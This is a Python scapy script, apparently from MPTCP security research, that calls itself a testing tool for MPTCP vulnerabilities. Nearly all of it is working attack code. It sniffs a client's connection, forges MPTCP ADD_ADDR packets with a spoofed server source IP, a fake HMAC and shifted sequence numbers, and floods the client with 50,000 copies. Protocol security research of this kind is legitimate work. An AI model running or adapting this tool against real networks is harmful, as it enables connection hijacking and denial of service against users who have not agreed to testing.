#Author: fabriziodemaria

import logging
import threading
import sys
from random import randint
from sniff_script import *
import time

logging.getLogger("scapy.runtime").setLevel(logging.DEBUG)
from scapy.all import *
from scapy.layers.inet import TCP, IP, Neighbor
from scapy.layers import mptcp
from scapy.sendrecv import sr1
from netaddr import *
from subprocess import check_output as execCommand



ADDRESS_ID = 6 # Any number that is not taken by the other subflows should work
SEQUENCE_OFFSET = 1000 # TODO Analyze this value used to manipulate ACK/SEQ numbers for the connection
CAPTURING_TIMEOUT = 60 # How long the attacking script will capture the conversation before quitting


def filter_source(p, srcIP):
    if p.haslayer(TCP):
        str = p.sprintf("%IP.src%")
        if str == srcIP:
            return True
    return False


def forge_addaddr(myIP, srcIP, srcPort, dstIP, dstPort, sniffedSeq, sniffedAck):
    """Forge ADD_ADDR2 packet with random HMAC"""
    pkt = (IP(version=4L,src=srcIP,dst=dstIP)/                            \
             TCP(sport=srcPort,dport=dstPort,flags="A",seq=sniffedSeq,ack=sniffedAck,\
                 options=[TCPOption_MP(mptcp=MPTCP_AddAddr(address_id=ADDRESS_ID,\
                                                           adv_addr=myIP, \
                                                           snd_mac=0x4b8d8d6d96f7d904))]))
    return pkt


def parse_args():
    import argparse
    import itertools
    import sys

    parser = argparse.ArgumentParser(description='Testing tool for MPTCP vulnerabilities. Requires root privileges for scapy.')
    parser.add_argument('advertisedIP', action='store', help='Advertised IP address')
    parser.add_argument('serverIP', action='store', help='Server IP address')
    parser.add_argument('clientIP', action='store', help='Client IP address')
    parser.add_argument('serverIf', action='store', help='Interface name to server')
    parser.add_argument('clientIf', action='store', help='Interface name to client')
    if len(sys.argv)!=6:
        parser.print_help()
        sys.exit(1)
    return parser.parse_args()


def main():
    args = parse_args()

    ADVERTISED_IP = args.advertisedIP
    CLIENT_IP = args.clientIP
    SERVER_IP = args.serverIP
    CLIENT_IF = args.clientIf
    SERVER_IF = args.serverIf

    pktl = sniff(iface=CLIENT_IF, lfilter=lambda p: filter_source(p, CLIENT_IP), count=1)

    # Sending ADD_ADDR flood to client
    addaddrlist = []
    addaddrlist.append(forge_addaddr(ADVERTISED_IP, SERVER_IP, pktl[0][TCP].dport, CLIENT_IP, pktl[0][TCP].sport, (pktl[0][TCP].ack)+SEQUENCE_OFFSET, (pktl[0][TCP].seq)-SEQUENCE_OFFSET))
    
    print "Preparing"
    for i in range (0, 50000):
        addaddrlist.append(addaddrlist[0].copy())
    start = time.time()
    print "Sending"
    for i in range (0, 1):
        send(addaddrlist, iface=CLIENT_IF, verbose=0)
    end = time.time()
    print(end - start)
    return

if __name__ == "__main__":
    main()
